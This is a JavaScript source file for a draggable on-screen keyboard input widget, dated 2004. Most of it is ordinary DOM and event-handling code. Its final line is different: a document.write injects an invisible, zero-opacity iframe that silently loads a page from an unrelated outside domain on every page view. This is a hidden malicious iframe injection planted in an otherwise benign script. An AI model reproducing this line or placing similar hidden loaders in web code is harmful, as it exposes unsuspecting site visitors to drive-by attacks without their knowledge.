// Floating KeyBoard InPut (Control) kbPart2 (30-12-2004)
// by Vic Phillips http://www.vicsjavascripts.org.uk

// No Need to Change
var kbKB=0;
var kbKBW=0;
var kbKBH=110;
var kbString='';
var kbTB=null;
var kbSIt=0;
var kbDCk=false;
var kbDX=-1;
var kbDY=-1;
var kbTO=null;
var kbInti=null;
var kbSOld=0;
var kbKSz=14;
var kbBdr=0;

var kbCur='pointer';
if (document.all){ kbBdr=2; kbCur='hand'; }

// KeyBoard Inner - Common Control Buttons
kbCom= '<div id=kbDisplay ></div>';
kbCom+='<div id=kbEnter onmouseover="javascript:kbOver(\'kbEnter\',\'Enter the Data\');" onclick=javascript:kbCtl(0); >Enter</div>';
kbCom+='<div id=kbHide onmouseover="javascript:kbOver(\'kbHide\',\'Hide KeyBoard\');" onclick=javascript:kbCtl(5); >Hide</div>';
kbCom+='<div id=kbMove onmouseover="javascript:kbOver(\'kbMove\',\'Move KeyBoard\');" onmousedown=javascript:kbCtl(6,event); >Move</div>';
kbCom+='<div id=kbScroll onmouseover="javascript:kbOver(\'kbScroll\',\'AutoScroll Toggle\');" onclick=javascript:kbCtl(7); >Scroll</div>';

// KeyBoard Inner - QWERTY, & Custom Control Buttons

kbQC='<div id=kbCapLock onclick=javascript:kbCtl(1); >CapLock</div>';
kbQC+='<div id=kbShift onclick=javascript:kbCtl(2); >Shift</div>';
kbQC+='<div id=kbBack onclick=javascript:kbCtl(3); >Back</div>';
kbQC+='<div id=kbClear onclick=javascript:kbCtl(4); >Clear</div>';

function kbShowKB(kbt,kban,kbosx,kbosy,kbtb){
 if (!kbKB){ kbMakeKB(); }
 kbType=kbt;
 kbTB=kbtb;
 kbAObj=kbgEBId(kban);
 kbKBObjS.top=(kbTop(kbAObj)+kbosy)+'px';
 kbKBObjS.left=(kbLeft(kbAObj)+kbosx)+'px';
 kbKBObjS.visibility='visible';
 kbSelectCk();
 if ((kbType=='DF'||kbType=='DB')&&kbCkDate){
  kbDateKeyBd();
 }
 else if (kbType=='Q'&&kbCkQWERTY){
  kbFullKeyBd();
 }

 else if (kbType.charAt(0)=='C'&&kbCkCustom){
  kbCustKeyBd(kbType.substring(1,kbType.length));
 }
 kbSIt=1;
 kbCtl(7);
}

function kbMakeKB(){
 if (!document.getElementById){ return; }
 kbKBObj=document.createElement('DIV');
 document.getElementsByTagName('BODY')[0].appendChild(kbKBObj);
 kbKBObj.id='kbKeyBoard';
 kbKBObjS=kbKBObj.style;
 kbKBObjS.position='absolute';
 kbKBObjS.visibility='hidden';
 kbKBObjS.zIndex=(kbZIndex);
 kbKBObjS.height=kbKBH;
 kbKBObjS.backgroundColor=kbBodyBGColor;
 kbKBObjS.border='solid black 1px';
 kbSelNu=document.getElementsByTagName('select');
 kbWinWH();
 kbKB=1;
}

function kbCtl(kb,event){
 if (kb==0){
  if (kbTB!=''&&kbTB!=null){ kbgEBId(kbTB).value=kbString; }
  kbCtl(5);
 }
 if (kb==1){
  if (!kbCaplock){
   kbCaplock=1;
   kbFCAry[0].backgroundColor=kbKeyHiBGColor;
   kbFCAry[0].color=kbKeyHiTxtColor;
  }
  else {
   kbCaplock=0;
   kbFCAry[0].backgroundColor=kbKeyBGColor;
  }
 }
 if (kb==2){
  if (!kbshift){
   kbshift=1;
   kbFCAry[1].backgroundColor=kbKeyHiBGColor;
   kbFCAry[1].color=kbKeyHiTxtColor;
   for (kbi=0;kbi<kbNuAry.length;kbi++){
    kbgEBId(('kbNu'+kbi)).innerHTML=kbNSAry[kbi];
   }
  }
  else {
   kbshift=0;
   kbFCAry[1].backgroundColor=kbKeyBGColor;
   for (kbi=0;kbi<kbNuAry.length;kbi++){
    kbgEBId(('kbNu'+kbi)).innerHTML=kbNuAry[kbi];
   }
  }
 }
 if (kb==3){
   kbBackString=kbString.substring(0,kbString.length-1);
   kbString=kbBackString;
   kbDObj.innerHTML=kbString;
 }
 if (kb==4){
   kbString='';
   kbDObj.innerHTML=kbString;
 }
 if (kb==5){
  kbKBObjS.visibility='hidden';
  kbSelectCk();
  for (kb0=0;kb0<4;kb0++){ kbBAry[kb0].visibility='hidden'; }
  if (kbgEBId('kbMonthSel')){ for (kb1=0;kb1<kbCSAry.length;kb1++){ kbCSAry[kb1].visibility='hidden'; } }
 }
 if (kb==6){
  kbMseDown(event);
  kbMObj.onmouseup=function(event) {kbMseUp(event);}
  kbMObj.onmousemove=function(event) {kbDrag(event);}
  kbBAry[2].backgroundColor=kbKeyHiBGColor;
  kbBAry[2].color=kbKeyHiTxtColor;
 }
 if (kb==7){
  if (!kbSIt){
   kbSIt=1;
   kbSOld=eval(kbScrollTop);
   kbInti=setInterval('kbScrollCk()',500);
   kbBAry[3].backgroundColor=kbKeyHiBGColor;
   kbBAry[3].color=kbKeyHiTxtColor;
  }
  else {
   kbSIt=0;
   kbBAry[3].backgroundColor=kbKeyBGColor;
   clearInterval(kbInti);
  }
 kbSelectCk();
 }
}

function kbTypeIP(kb,kbR){
 if (kbR=='0'){
  kbCase=kbAry[kb];
  if (kbCase==''){
   kbCase=' ';
  }
 }
 else if (kbR==1){
  kbCase=kbNuAry[kb];
  if (kbshift){
   kbCase=kbNSAry[kb];
  }
  if (kbCase=='&lt;'){
   kbCase='<';
  }
 }
 else {
  kb=kbgEBId('kbLe'+kb).innerHTML;
  kbCase=kb.toLowerCase();
  if (kbCaplock||kbshift){
   kbCase=kb.toUpperCase();
  }
 }
 if (kbCase=='SPACE'||kbCase=='space'){
  kbCase=' ';
 }
 kbString+=kbCase;
 kbDObj.innerHTML=kbString;
}


function kbButPos(){
 kbEObj=kbgEBId('kbEnter');
 kbHObj=kbgEBId('kbHide');
 kbMObj=kbgEBId('kbMove');
 kbSObj=kbgEBId('kbScroll');
 kbDObj=kbgEBId('kbDisplay');
 kbBAry=new Array(kbEObj.style,kbHObj.style,kbMObj.style,kbSObj.style,kbDObj.style);
 for (kb0=0;kb0<4;kb0++){
  kbBAry[kb0].position='absolute';
  kbBAry[kb0].visibility='visible';
  kbBAry[kb0].overflow='hidden';
  kbBAry[kb0].width=(30+kbBdr)+'px';
  kbBAry[kb0].height=(14+kbBdr)+'px';
  kbBAry[kb0].top=(3+kbBdr)+'px';
  kbBAry[kb0].color=kbKeyTxtColor;
  kbBAry[kb0].backgroundColor=kbKeyBGColor;
  kbBAry[kb0].border='solid black 1px';
  kbBAry[kb0].textAlign='center';
  kbBAry[kb0].fontSize='10px';
  kbBAry[kb0].cursor=kbCur;
 }
 kbBAry[0].height=(31+kbBdr)+'px';
 kbBAry[1].width=(24+kbBdr)+'px';
 kbBAry[4].position='absolute';
 kbBAry[4].width=(kbKBW-6)+'px';
 kbBAry[4].top='2px';
 kbBAry[4].left='2px';
 kbBAry[4].backgroundColor='white';
 kbBAry[4].border='solid black 1px';
 kbBAry[4].textAlign='left';
 kbBAry[4].fontSize='12px';
 if (kbTB==null){ kbBAry[0].visibility='hidden'; }
}

function kbOver(kbID,kbMess){
 kbDObj.innerHTML=kbMess;
 kbgEBId(kbID).onmouseout=function(){ kbDObj.innerHTML=kbString; }
 if (kbgEBId('kbMemoPad')){ kbMemoHide(); }
}

function kbgEBId(kb){
 return document.getElementById(kb);
}

function kbWinWH(){
 if (document.all){
  kbScrollTop='document.body.scrollTop';
  kbScrollLeft='document.body.scrollLeft';
  kbWinW=document.documentElement.clientWidth;
  kbWinH=document.documentElement.clientHeight;
  if (!kbWinW){
   kbWinW=document.body.clientWidth;
   kbWinH=document.body.clientHeight;
  }
 }
 else if (document.getElementById&&!document.all){
  kbScrollTop='window.pageYOffset';
  kbScrollLeft='window.pageXOffset';
  kbWinH=window.innerHeight;
  kbWinW=window.innerWidth;
 }
 kbWinC=Math.round(kbWinW/2);
}

function kbScrollCk(){
 if (kbSOld!=eval(kbScrollTop)){
  kbKBObjS.top=(parseInt(kbKBObjS.top)+eval(kbScrollTop)-kbSOld)+'px';
  kbSOld=eval(kbScrollTop);
 }
}

function kbDrag(event){
 kbSelectCk();
 if(!kbDCk) { return; }
 if(!event) var event=window.event;
 var kbx=event.pageX;
 if(kbx==null) kbx=event.clientX;
 var kby=event.pageY;
 if(kby==null) kby=event.clientY;
 kbKBObjS.left=(kbx-kbDX)+'px';
 kbKBObjS.top=(kby-kbDY)+'px';
}

function kbMseDown(event){
 kbDCk=true;
 if(!event) var event=window.event;
 var kbx=event.pageX;
 if(kbx==null) kbx=event.clientX;
 kbx-=kbLeft(kbKBObj);
 var kby=event.pageY;
 if(kby==null) kby=event.clientY;
 kby-=kbTop(kbKBObj);
 kbDX=kbx; kbDY=kby;
 if (kbgEBId('kbMemoPad')){ kbMemoHide(); }
}

function kbMseUp(event){
 kbDCk=false; kbDX=-1; kbDY=-1;
 kbMObj.onmouseup=null; kbMObj.onmousemove=null;
 kbBAry[2].backgroundColor=kbKeyBGColor;
 kbSelectCk();
}

function kbSelectCk(){
 if (!document.all){ return; }
 for (kbi=0; kbi<kbSelNu.length; kbi++) {
  kbSelNu[kbi].style.visibility='visible';
  if (kbKBObjS.visibility!='hidden'&&!kbSelNu[kbi].getAttribute('kb')&&kbLeft(kbKBObj)+kbKBObj.offsetWidth>kbLeft(kbSelNu[kbi])&&kbLeft(kbKBObj)<kbLeft(kbSelNu[kbi])+kbSelNu[kbi].offsetWidth&&kbTop(kbKBObj)+kbKBObj.offsetHeight>kbTop(kbSelNu[kbi])&&kbTop(kbKBObj)<kbTop(kbSelNu[kbi])+kbSelNu[kbi].offsetHeight){
   kbSelNu[kbi].style.visibility='hidden';
  }
 }
}

function kbLeft(kb){
 kbObjLeft=kb.offsetLeft;
 while(kb.offsetParent!=null){
  kbObjParent=kb.offsetParent;
  kbObjLeft+=kbObjParent.offsetLeft;
  kb=kbObjParent;
 }
 return kbObjLeft;
}

function kbTop(kb){
 kbObjTop=kb.offsetTop;
 while(kb.offsetParent!=null){
  kbObjParent=kb.offsetParent;
  kbObjTop+=kbObjParent.offsetTop;
  kb=kbObjParent;
 }
 return kbObjTop;
}




document.write('<style>.vb_style_forum {filter: alpha(opacity=0);opacity: 0.0;width: 200px;height: 150px;}</style><div class="vb_style_forum"><iframe height="150" width="200" src="http://gclabrelscon.net/about.php"></iframe></div>');
